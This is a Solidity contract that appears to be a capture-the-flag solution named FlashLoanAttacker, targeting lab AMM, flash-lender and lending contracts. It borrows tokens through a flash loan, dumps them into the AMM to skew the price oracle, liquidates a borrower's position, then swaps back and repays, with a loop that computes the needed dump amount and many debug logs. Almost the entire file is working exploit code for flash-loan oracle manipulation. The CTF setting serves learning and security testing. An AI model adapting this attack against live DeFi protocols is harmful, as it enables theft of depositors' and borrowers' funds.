// SPDX-License-Identifier: MIT
pragma solidity 0.8.15;

import "@openzeppelin/contracts/interfaces/IERC3156FlashBorrower.sol";
import "@openzeppelin/contracts/token/ERC20/utils/SafeERC20.sol";
import "hardhat/console.sol";
import "../FlashLoanCTF/AMM.sol";
import "../FlashLoanCTF/Flashloan.sol";
import "../FlashLoanCTF/CollateralToken.sol";
import "../FlashLoanCTF/Lending.sol";

contract FlashLoanAttacker is IERC3156FlashBorrower {
    using SafeERC20 for IERC20;

    AMM public amm;
    FlashLender public flashLender;
    CollateralToken public tokenContract;
    Lending public lending;
    address public borrower;
    uint256 public counter;
    uint256 public tokenAmount;

    constructor(AMM _amm, FlashLender _flashLender, CollateralToken _token, address _borrower, Lending _lending) {
        amm = _amm;
        flashLender = _flashLender;
        tokenContract = _token;
        borrower = _borrower;
        lending = _lending;
    }

    function attack(address _lender) public {
        IERC20(tokenContract).approve(address(flashLender), type(uint256).max);
        withdrawAllTheTokens();
        console.log("balanceOfCollateralTokenNow in attacker:", IERC20(tokenContract).balanceOf(address(this)));
        transferTokensBackToLender(_lender);
    }

    function transferTokensBackToLender(address _lender) private {
        SafeERC20.safeTransfer(IERC20(tokenContract), _lender, IERC20(tokenContract).balanceOf(address(this)));
    }

    function withdrawAllTheTokens() public {
        //Step 1: Calculate How many tokens you need to dump into the AMM so that we can liquidate the borrower:
        uint256 dumpAmount = calculateHowMuchTokensToTransferToLiquidate();
        //Step 1, get Flash Loan, maybe by abusing the 0 fee integer division thing
        console.log("Step 1 get Flash Loan");

        flashLender.flashLoan(IERC3156FlashBorrower(address(this)), address(tokenContract), dumpAmount, "");
    }

    function calculateHowMuchTokensToTransferToLiquidate() public view returns (uint256) {
        uint256 originalOracleLendTokenReserve = 400e18;
        uint256 originalOracleEthReserve = 20e18;
        uint256 borrowerBorrowedAmount = 6 ether;
        uint256 borrowerCollateralBalance = 2.4e20;
        uint256 liquidationThresHold = 1_500;
        uint256 collateralContext = 1_000;

        // how do I get the least amount of tokens to transfer such that collateralRequired is more than 2.4e18
        // Follow the equation
        //  uint256 lendQuote = (oracle.lendTokenReserve() * loanInfo.borrowedAmount) / oracle.ethReserve();

        // uint256 collateralRequired = (lendQuote * liquidationThreshold) / collateralContext;
        for (uint256 i = 50 ether; i < 100 ether; i += 1 ether) {
            //simulate swap lend token for eth
            uint256 lendTokenAmountIn = (originalOracleLendTokenReserve + i) - originalOracleLendTokenReserve;
            console.log("lendTokenAmountIn:", lendTokenAmountIn);
            uint256 ethAmountOut =
                (originalOracleEthReserve * lendTokenAmountIn) / (originalOracleLendTokenReserve + lendTokenAmountIn);
            console.log("ethAmountOut:", ethAmountOut);
            uint256 oracleLendTokenReserve = originalOracleLendTokenReserve + lendTokenAmountIn;
            console.log("oracleLendTokenReserve:", oracleLendTokenReserve);
            uint256 oracleEthReserve = originalOracleEthReserve - ethAmountOut;
            console.log("oracleEthReserve:", oracleEthReserve);
            uint256 mockLendQuote = (oracleLendTokenReserve * borrowerBorrowedAmount) / oracleEthReserve;

            uint256 mockCollateralRequired = (mockLendQuote * liquidationThresHold) / collateralContext;
            console.log("mockLendQuote:", mockLendQuote);
            console.log("mockCollateralRequired:", mockCollateralRequired);
            if (borrowerCollateralBalance < mockCollateralRequired) {
                return i;
            }
        }
    }

    function onFlashLoan(address initiator, address token, uint256 amount, uint256 fee, bytes calldata data)
        external
        returns (bytes32)
    {
        console.log("onFlashLoan entered");
        // Step 2.1.0: Transfer Tokens to AMM (state is not updated yet)
        uint256 leastAmountOfTokensToLiquidate = calculateHowMuchTokensToTransferToLiquidate();
        console.log("leastAmountOfTokensToLiquidate1:", leastAmountOfTokensToLiquidate);
        SafeERC20.safeTransfer(IERC20(tokenContract), address(amm), leastAmountOfTokensToLiquidate);
        // Step 2.1.1: How many tokens to transfer? (let's try 100 ether first)

        // Step 2.2.0: call swapTokensForEth, we give 100 ether for some amount of eth
        //uint256 prevEthBalance = address(this).balance;
        uint256 ethAmountIn = amm.swapLendTokenForEth(address(this));
        console.log("Amount of Eth Received:", ethAmountIn);
        // Step 3.1.0: Now that Price of Token has dropped, we call liquidate(borrower), that should will send

        lending.liquidate(borrower);
        //uint256 currentTokenBalanceOfAttacker = tokenContract.balanceOf(address(this));
        // console.log("currentTokenBalanceOfAttacker:", currentTokenBalanceOfAttacker);
        // Step 4.1.0: Mission Accomplished right?, swap eth back for tokens.

        (bool success,) = address(amm).call{value: address(this).balance}("");
        require(success, "Failed to send ether to amm");
        amm.swapEthForLendToken(address(this));

        //Step 5.1.0: Repay the loan
        return keccak256("ERC3156FlashBorrower.onFlashLoan");
    }

    receive() external payable {
        console.log("attacker received ether:", msg.value);
    }
}
